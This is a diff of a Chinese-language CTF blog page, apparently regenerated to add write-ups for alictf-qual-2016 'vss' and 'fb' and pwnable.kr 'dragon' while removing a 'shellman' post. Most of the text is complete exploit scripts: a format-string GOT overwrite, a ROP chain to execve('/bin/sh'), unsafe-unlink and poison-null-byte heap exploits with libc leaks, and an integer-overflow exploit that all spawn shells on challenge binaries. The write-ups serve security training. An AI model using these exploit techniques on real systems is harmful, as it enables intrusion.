class="title">encrypt</span><span class="params">(io, payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">' : '</span>)</span><br><span class="line">    io.writeline(str(len(payload)))</span><br><span class="line">    io.read_until(<span class="string">'paste your plain text data'</span>)</span><br><span class="line">    io.writeline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">decrypt</span><span class="params">(io, payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">' : '</span>)</span><br><span class="line">    io.writeline(str(len(payload)))</span><br><span class="line">    io.read_until(<span class="string">'paste your hex encoded data'</span>)</span><br><span class="line">    io.writeline(str(payload))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">sub_egcd</span><span class="params">(a, b)</span>:</span></span><br><span class="line">    <span class="keyword">if</span> b == <span class="number">0</span>:</span><br><span class="line">        <span class="keyword">return</span> a, <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        g, x, y = sub_egcd(b, a % b)</span><br><span class="line">        <span class="keyword">return</span> g, y, x - a / b * y</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">egcd</span><span class="params">(a,b)</span>:</span></span><br><span class="line">    <span class="keyword">return</span> sub_egcd(a,b)[<span class="number">1</span>]%b</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_cypher</span><span class="params">(io, plain)</span>:</span></span><br><span class="line">    encrypt(io, plain)</span><br><span class="line">    <span class="keyword">return</span> [io.read_line() <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>)][<span class="number">2</span>][<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_plain</span><span class="params">(io, cypher)</span>:</span></span><br><span class="line">    decrypt(io, cypher)</span><br><span class="line">    <span class="keyword">return</span> [io.read_line() <span class="keyword">for</span> j <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">3</span>)][<span class="number">2</span>][<span class="number">0</span>:-<span class="number">1</span>]</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exp</span><span class="params">(target)</span>:</span></span><br><span class="line">    p = <span class="number">7</span></span><br><span class="line">    q = <span class="number">37</span></span><br><span class="line">    e = <span class="number">7</span></span><br><span class="line">    d = egcd(e, (p-<span class="number">1</span>) * (q-<span class="number">1</span>))</span><br><span class="line">    <span class="comment"># print 'p=%d\nq=%d\ne=%d\nd=%d\n' % (p, q, e, d)</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># io = zio(target, timeout = 100000, print_read = COLORED(RAW, 'red'), print_write = COLORED(RAW, 'yellow'))</span></span><br><span class="line">    io = zio(target, timeout = <span class="number">100000</span>, print_read = <span class="keyword">False</span>, print_write = <span class="keyword">False</span>)</span><br><span class="line">    set_key(io, p, q, e, d)</span><br><span class="line"></span><br><span class="line">    plt_system  = <span class="number">0x004007c0</span></span><br><span class="line">    got_printf  = <span class="number">0x00602028</span></span><br><span class="line">    got_putchar = <span class="number">0x00602000</span></span><br><span class="line">    adr_ret     = <span class="number">0x0040122b</span></span><br><span class="line"></span><br><span class="line">    payload  = get_cypher(io, <span class="string">'%83$n%79$n%064lx%78$hn%82$hn%01920lx%77$hn%02667lx%81$hn;/bin/sh\x00'</span>)</span><br><span class="line">    payload += l64(got_printf)</span><br><span class="line">    payload += l64(got_printf + <span class="number">2</span>)</span><br><span class="line">    payload += l64(got_printf + <span class="number">4</span>)</span><br><span class="line">    payload += l64(got_printf + <span class="number">6</span>)</span><br><span class="line">    payload += l64(got_putchar)</span><br><span class="line">    payload += l64(got_putchar + <span class="number">2</span>)</span><br><span class="line">    payload += l64(got_putchar + <span class="number">4</span>)</span><br><span class="line">    payload += l64(got_putchar + <span class="number">6</span>)</span><br><span class="line">    decrypt(io, payload)</span><br><span class="line">    io.interact()</span><br><span class="line"></span><br><span class="line">exp(target)</span><br></pre></td></tr></table></figure>
 
           
         
@@ -809,8 +553,8 @@
             
               
                 
-                <a class="post-title-link" href="/2016/07/21/qiangwang-qual-2015-shellman/" itemprop="url">
-                  qiangwang-qual-2015-shellman
+                <a class="post-title-link" href="/2016/07/31/alictf-qual-2016-vss/" itemprop="url">
+                  alictf-qual-2016-vss
                 </a>
               
             
@@ -823,8 +567,8 @@
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-21T00:00:00+08:00" content="2016-07-21">
-              2016-07-21
+            <time itemprop="dateCreated" datetime="2016-07-31T00:00:00+08:00" content="2016-07-31">
+              2016-07-31
             </time>
           </span>
 
@@ -853,8 +597,137 @@
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/21/qiangwang-qual-2015-shellman/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/21/qiangwang-qual-2015-shellman/" itemprop="commentsCount"></span>
+                <a href="/2016/07/31/alictf-qual-2016-vss/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/31/alictf-qual-2016-vss/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h1 id="Environment">Environment</h1><blockquote>
+<p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_i386</p>
+</blockquote>
+<h1 id="Conclusion">Conclusion</h1><p>之前线上做的时候没有思路，溢出点很容易找到，但是不知道怎么利用，以为是<code>open-read-write</code>的方式，后来比赛结束后看了网上发的writeup(我也忘了是看的哪个队的writeup了，所以<strong>Referance</strong>上放不了了)，才知道直接<code>ROP</code>系统调用即可，隔了几个月，重新自己做了下，本地测试</p>
+<h1 id="Trick">Trick</h1><ul>
+<li><code>execve(&#39;/bin/sh\x00&#39;, 0, 0)</code>，设置好<code>rax=0x3b;rdi=&#39;/bin/sh\x00&#39;;rsi=0;rdx=0</code></li>
+<li>程序是静态链接，想要的gadgets基本上都能找到</li>
+<li>利用<code>add rsp, 0x58</code>来抬升栈</li>
+</ul>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./vss_72e30bb98bdfbf22307133c16f8c9966'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line">io.gdb_hint([<span class="number">0x4011b0</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># gadgets</span></span><br><span class="line">add_rsp = <span class="number">0x0046f205</span>    <span class="comment"># add rsp, 0x58 ; ret</span></span><br><span class="line">pop_rsi = <span class="number">0x00401937</span>    <span class="comment"># pop rsi       ; ret</span></span><br><span class="line">pop_rdx = <span class="number">0x0043ae05</span>    <span class="comment"># pop rdx       ; ret</span></span><br><span class="line">pop_r12 = <span class="number">0x004004c3</span>    <span class="comment"># pop r12       ; ret</span></span><br><span class="line">pop_rax = <span class="number">0x0046f208</span>    <span class="comment"># pop rax       ; ret</span></span><br><span class="line">mov_rdi = <span class="number">0x00495968</span>    <span class="comment"># mov rdi, rsp  ; call r12</span></span><br><span class="line">syscall = <span class="number">0x004004b8</span>    <span class="comment"># syscall</span></span><br><span class="line"></span><br><span class="line">payload =   <span class="string">'py'</span> + <span class="string">'A'</span> * <span class="number">70</span></span><br><span class="line">payload +=  l64(add_rsp)</span><br><span class="line">payload =   payload.ljust(<span class="number">0x58</span>, <span class="string">'A'</span>)</span><br><span class="line">payload +=  l64(pop_rsi)</span><br><span class="line">payload +=  l64(<span class="number">0</span>)</span><br><span class="line">payload +=  l64(pop_rdx)</span><br><span class="line">payload +=  l64(<span class="number">0</span>)</span><br><span class="line">payload +=  l64(pop_r12)</span><br><span class="line">payload +=  l64(syscall)</span><br><span class="line">payload +=  l64(pop_rax)</span><br><span class="line">payload +=  l64(<span class="number">0x3b</span>)</span><br><span class="line">payload +=  l64(mov_rdi)</span><br><span class="line">payload +=  <span class="string">'/bin/sh\x00'</span></span><br><span class="line"></span><br><span class="line">io.read_until(<span class="string">'Password:'</span>)</span><br><span class="line">io.writeline(payload)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/07/31/alictf-qual-2016-fb/" itemprop="url">
+                  alictf-qual-2016-fb
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-31T00:00:00+08:00" content="2016-07-31">
+              2016-07-31
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/CTFs/" itemprop="url" rel="index">
+                    <span itemprop="name">CTFs</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/31/alictf-qual-2016-fb/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/31/alictf-qual-2016-fb/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -882,8 +755,135 @@
             <h1 id="Environment">Environment</h1><blockquote>
 <p>Local<br>Libc  : libc6_2.19-0ubuntu6.6_amd64</p>
 </blockquote>
-<h1 id="Conclusion">Conclusion</h1><p>利用<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>中提到的<code>unsafe-unlink2</code>的技巧，通过泄露libc来调用system</p>
-<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./shellman.b400c663a0ca53f1f6c6fcbf60defa8d'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">100000</span>)</span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007b0])    # new</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x400790])     # delete</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007a0])     # edit</span></span><br><span class="line">io.gdb_hint([<span class="number">0x4007a7</span>])     <span class="comment"># edit finish</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007c0])     # list</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'SHELLC0DE 0: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_shellcode</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode(in raw format): '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_shellcode</span><span class="params">(index, shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line">    io.read_until(<span class="string">'Length of shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode: '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_shellcode</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'A'</span> * <span class="number">0x90</span>)</span><br><span class="line">new_shellcode(<span class="string">'B'</span> * <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">adr_shellcode0  = <span class="number">0x6016d0</span></span><br><span class="line"></span><br><span class="line">fake0   =   l64(<span class="number">0x30</span>)</span><br><span class="line">fake0   +=  l64(<span class="number">0x91</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">2</span>)</span><br><span class="line">fake0   =   fake0.ljust(<span class="number">0x90</span>, <span class="string">'A'</span>)</span><br><span class="line">fake1   =   l64(<span class="number">0x90</span>)</span><br><span class="line">fake1   +=  l64(<span class="number">0xa0</span>)</span><br><span class="line">payload = fake0 + fake1</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, payload)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_free    = <span class="number">0x601600</span></span><br><span class="line">edit_shellcode(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x8</span> + l64(<span class="number">0x1</span>) + l64(<span class="number">0x8</span>) + l64(got_free))</span><br><span class="line">list_shellcode()</span><br><span class="line"></span><br><span class="line">adr_free        = l64(io.read(<span class="number">0x10</span>).decode(<span class="string">'hex'</span>))</span><br><span class="line">offset_free     = <span class="number">0x82df0</span></span><br><span class="line">libc_base       = adr_free - offset_free</span><br><span class="line">offset_system   = <span class="number">0x46640</span></span><br><span class="line">adr_system      = libc_base + offset_system</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, l64(adr_system))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h1 id="Conclusion">Conclusion</h1><p>练习用，第一次做<code>poison-null-byte</code>的题目，实现unlink后没有思路了，因为<code>show_message</code>没有实现，没有想到如何泄露libc，后来看了<strong>@flappypig</strong>战队的writeup，学到了一个用<code>printf</code>来泄露栈上的<code>libc_start_main_ret</code>的思路</p>
+<h1 id="Trick">Trick</h1><ul>
+<li><code>poison-null-byte</code> + <code>unlink</code></li>
+<li>替换got表<code>free</code>函数地址为<code>printf</code>函数plt地址，然后通过delete来泄露栈上的libc函数地址</li>
+</ul>
+<h1 id="Exploit">Exploit</h1><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./fb_541e262e8cef6f48795a91cb1c17ac0b'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"><span class="comment"># io.gdb_hint([0x400cdb]) # finish init</span></span><br><span class="line">io.gdb_hint([<span class="number">0x400ce7</span>]) <span class="comment"># finish set</span></span><br><span class="line"><span class="comment"># io.gdb_hint([0x400cf3]) # finish delete</span></span><br><span class="line"><span class="comment"># io.gdb_hint([0x400cdb, 0x400ce7, 0x400cf3])</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">init_message</span><span class="params">(len)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Input the message length:'</span>)</span><br><span class="line">    io.writeline(str(len))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">set_message</span><span class="params">(idx, payload)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Input the message index:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.read_until(<span class="string">'Input the message content:'</span>)</span><br><span class="line">    io.writeline(payload)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete_message</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'Choice:'</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Input the message index:'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="comment"># struct message&#123;</span></span><br><span class="line"><span class="comment">#     void *addr;</span></span><br><span class="line"><span class="comment">#     long length;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 0x6020b4: num of message(0 ~ 15)</span></span><br><span class="line"><span class="comment"># 0x6020c0: struct message[]</span></span><br><span class="line"></span><br><span class="line">chunk0      = <span class="number">0x6020c0</span></span><br><span class="line">got_free    = <span class="number">0x602018</span></span><br><span class="line">plt_printf  = <span class="number">0x4006e0</span></span><br><span class="line"></span><br><span class="line">init_message(<span class="number">0xf8</span>)</span><br><span class="line">init_message(<span class="number">0xf8</span>)</span><br><span class="line">init_message(<span class="number">0xf8</span>)</span><br><span class="line">init_message(<span class="number">0xf8</span>)</span><br><span class="line"></span><br><span class="line">fake_chunk  =   l64(<span class="number">0x100</span>)</span><br><span class="line">fake_chunk  +=  l64(<span class="number">0x101</span>)</span><br><span class="line">fake_chunk  +=  l64(chunk0 - <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">fake_chunk  +=  l64(chunk0 - <span class="number">0x8</span> * <span class="number">2</span>)</span><br><span class="line">fake_chunk  =   fake_chunk.ljust(<span class="number">0xf0</span>, <span class="string">'A'</span>)</span><br><span class="line">fake_chunk  +=  l64(<span class="number">0xf0</span>)</span><br><span class="line">set_message(<span class="number">0</span>, fake_chunk)</span><br><span class="line">delete_message(<span class="number">1</span>)</span><br><span class="line">set_message(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x18</span> + l64(got_free) + l64(<span class="number">0xf8</span>))</span><br><span class="line">set_message(<span class="number">0</span>, l64(plt_printf)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">set_message(<span class="number">2</span>, <span class="string">'%17$lx'</span>)</span><br><span class="line"></span><br><span class="line">delete_message(<span class="number">2</span>)</span><br><span class="line"></span><br><span class="line">adr_libc_start_main = int(io.read_until(<span class="string">'Done'</span>)[<span class="number">0</span>:-<span class="number">4</span>], <span class="number">16</span>)</span><br><span class="line">off_libc_start_main = <span class="number">0x21ec5</span></span><br><span class="line">libc_base           = adr_libc_start_main - off_libc_start_main</span><br><span class="line">off_system          = <span class="number">0x46640</span></span><br><span class="line">adr_system          = libc_base + off_system</span><br><span class="line"></span><br><span class="line"><span class="keyword">print</span> <span class="string">'[+]libc base : %d'</span> % libc_base</span><br><span class="line"></span><br><span class="line">set_message(<span class="number">0</span>, l64(adr_system)[<span class="number">0</span>:<span class="number">6</span>])</span><br><span class="line">set_message(<span class="number">3</span>, <span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">delete_message(<span class="number">3</span>)</span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h1 id="Reference">Reference</h1><p><a href="https://drive.google.com/file/d/0B0BNOZmT4f4kVFZyajNyblU3MVE/view" target="_blank" rel="external">https://drive.google.com/file/d/0B0BNOZmT4f4kVFZyajNyblU3MVE/view</a></p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2016/07/28/pwnable-rookiss-dragon/" itemprop="url">
+                  pwnable.kr-rookiss-dragon
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            <span class="post-meta-item-icon">
+              <i class="fa fa-calendar-o"></i>
+            </span>
+            <span class="post-meta-item-text">发表于</span>
+            <time itemprop="dateCreated" datetime="2016-07-28T00:00:00+08:00" content="2016-07-28">
+              2016-07-28
+            </time>
+          </span>
+
+          
+            <span class="post-category" >
+              &nbsp; | &nbsp;
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              <span class="post-meta-item-text">分类于</span>
+              
+                <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
+                  <a href="/categories/Wargames/" itemprop="url" rel="index">
+                    <span itemprop="name">Wargames</span>
+                  </a>
+                </span>
+
+                
+                
+
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                &nbsp; | &nbsp;
+                <a href="/2016/07/28/pwnable-rookiss-dragon/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count ds-thread-count" data-thread-key="2016/07/28/pwnable-rookiss-dragon/" itemprop="commentsCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+
+          
+          
+
+          
+        </div>
+      </header>
+    
+
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h2 id="Trick">Trick</h2><p>有符号整数溢出</p>
+<h2 id="Conclusion">Conclusion</h2><p>看到hero的hp是4字节大小，然而monster的是1个字节的，就想到了整数溢出绕过hp的检测</p>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./dragon'</span></span><br><span class="line">target  = (<span class="string">'pwnable.kr'</span>, <span class="number">9004</span>)</span><br><span class="line"></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">10000</span>)</span><br><span class="line"><span class="comment">#io.gdb_hint([0x08048d78])</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># struct monster &#123;</span></span><br><span class="line"><span class="comment">#     int     *print_func(struct monster *)</span></span><br><span class="line"><span class="comment">#     int     type ; 1 mom, 0 baby</span></span><br><span class="line"><span class="comment">#     char    hp;</span></span><br><span class="line"><span class="comment">#     char    heals;</span></span><br><span class="line"><span class="comment">#     int     deals;</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># struct hero &#123;</span></span><br><span class="line"><span class="comment">#     int     type ; 1 priest, 2 knight</span></span><br><span class="line"><span class="comment">#     int     hp;</span></span><br><span class="line"><span class="comment">#     int     mp;</span></span><br><span class="line"><span class="comment">#     int     *print_func(struct hero *)</span></span><br><span class="line"><span class="comment"># &#125;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">0</span>, <span class="number">4</span>):</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line"></span><br><span class="line">io.writeline(l32(<span class="number">0x08048dbf</span>))</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
 
           
         
@@ -916,7 +916,7 @@
 
   
   <nav class="pagination">
-    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
+    <a class="extend prev" rel="prev" href="/page/5/"><i class="fa fa-angle-left"></i></a><a class="page-number" href="/">1</a><span class="space">&hellip;</span><a class="page-number" href="/page/5/">5</a><span class="page-number current">6</span><a class="page-number" href="/page/7/">7</a><a class="page-number" href="/page/8/">8</a><a class="extend next" rel="next" href="/page/7/"><i class="fa fa-angle-right"></i></a>
   </nav>
 
 
@@ -957,7 +957,7 @@
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">32</span>
+              <span class="site-state-item-count">39</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
@@ -974,7 +974,7 @@
           
             <div class="site-state-item site-state-tags">
               <a href="/tags">
-                <span class="site-state-item-count">37</span>
+                <span class="site-state-item-count">43</span>
                 <span class="site-state-item-name">标签</span>
               </a>
             </div>
@@ -1021,6 +1021,10 @@
               
                 <li class="links-of-blogroll-item">
                   <a href="http://math1as.com" title="math1as" target="_blank">math1as</a>
+                </li>
+              
+                <li class="links-of-blogroll-item">
+                  <a href="http://http://o0xmuhe.me" title="muhe" target="_blank">muhe</a>
                 </li>
               
             </ul>
